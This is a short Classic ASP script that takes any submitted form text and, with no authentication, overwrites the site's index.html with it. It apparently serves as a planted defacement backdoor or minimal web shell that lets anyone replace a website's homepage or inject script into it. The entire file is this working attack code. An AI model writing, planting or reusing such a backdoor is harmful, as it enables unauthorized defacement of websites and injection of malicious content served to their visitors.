<%
            dim fname
            fname=request.form("text")

            If fname<>"" Then

            

            Set objStream = Server.CreateObject("ADODB.Stream")
            With objStream
            .Open
            .Charset = "utf-8"
            .Position = objStream.Size
            .WriteText=fname
            .SaveToFile server.mappath("index.html"),2 
            .Close
            End With
            Set objStream = Nothing
            End If
         %>